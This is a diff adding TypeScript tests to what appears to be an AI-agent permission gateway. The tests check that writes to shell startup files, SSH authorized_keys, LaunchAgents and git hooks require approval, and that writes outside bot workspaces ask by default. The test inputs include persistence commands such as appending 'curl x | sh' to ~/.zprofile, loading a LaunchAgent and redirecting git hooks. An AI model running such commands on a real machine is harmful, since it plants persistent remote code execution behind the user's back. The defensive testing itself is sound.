@@ -362,6 +362,43 @@ assert.equal(gateway.sensitive({ name: 'mcp__echo__get', args: { q: '.ssh/' } })
   assert.doesNotMatch(profile, /tmpdir/);
 }
 
+// #104: startup files, login items, SSH keys and git hooks ask for writes and
+// shell commands even with 항상 허용; reading them doesn't. File tools writing
+// outside the Bot workspaces ask by default.
+{
+  const data = '/Users/a/Library/Application Support/OCTO CREW';
+  const workspaces = `${data} Workspaces`;
+  const w = { cwd: `${workspaces}/bot_1`, dataDir: data, home: '/Users/a', workspaces };
+  const yes = (name: string, args: Record<string, unknown>) => assert.equal(gateway.sensitive({ name, args }, w), true, JSON.stringify(args));
+  const no = (name: string, args: Record<string, unknown>) => assert.equal(gateway.sensitive({ name, args }, w), false, JSON.stringify(args));
+  yes('Write', { file_path: '~/.zshrc', content: 'curl x | sh' });
+  yes('Edit', { file_path: '/Users/a/.bash_profile', old_string: 'a', new_string: 'b' });
+  yes('Write', { file_path: '/Users/a/Library/LaunchAgents/com.x.plist', content: '<plist/>' });
+  yes('Write', { file_path: '/Users/a/.ssh/authorized_keys', content: 'ssh-ed25519 AAAA' });
+  yes('Write', { file_path: '/Users/a/code/app/.git/hooks/pre-commit', content: 'x' });
+  yes('Bash', { command: 'echo "curl x | sh" >> ~/.zprofile' });
+  yes('Bash', { command: 'cp a.plist ~/Library/LaunchAgents/ && launchctl load ~/Library/LaunchAgents/a.plist' });
+  yes('Bash', { command: 'git config core.hooksPath /tmp/h' });
+  no('Read', { file_path: '/Users/a/.zshrc' });
+  no('Write', { file_path: 'notes/profile.md', content: 'edit ~/.zshrc later' });
+  no('Bash', { command: 'git commit -m "update profile docs"' });
+
+  const out = (name: string, args: Record<string, unknown>) => gateway.writesOutside({ name, args }, w);
+  assert.equal(out('Write', { file_path: 'report.md', content: 'x' }), false);
+  assert.equal(out('Write', { file_path: '../bot_2/draft.md', content: 'x' }), false); // a teammate's workspace
+  assert.equal(out('Edit', { file_path: '/Users/a/Documents/plan.md' }), true);
+  assert.equal(out('Write', { file_path: '../../x.md', content: 'x' }), true);
+  assert.equal(out('Write', { file_path: '~/Desktop/x.md', content: 'x' }), true);
+  assert.equal(out('NotebookEdit', { notebook_path: '/tmp/n.ipynb' }), true);
+  assert.equal(out('Write', { content: 'x' }), true); // no path: fail closed
+  assert.equal(out('Read', { file_path: '/Users/a/Documents/plan.md' }), false);
+  assert.equal(gateway.writesOutside({ name: 'Write', args: { file_path: '/etc/x' } }), false); // no Bot, no workspace to check
+  // Default ask; a rule can allow it; a scheduled run fails closed.
+  assert.equal(gateway.decide({ name: 'Write', args: {} }, [], { Write: 'ask' }).effect, 'ask');
+  assert.equal(gateway.decide({ name: 'Write', args: {} }, [{ id: 'r', effect: 'allow', tool: 'Write' }], { Write: 'ask' }).effect, 'allow');
+  assert.equal(gateway.decide({ name: 'Write', args: {}, initiator: 'routine' }, [], { Write: 'ask' }).effect, 'deny');
+}
+
 // #95: workspaces in their own folder next to the data folder.
 {
   const data = '/Users/a/Library/Application Support/OCTO CREW';
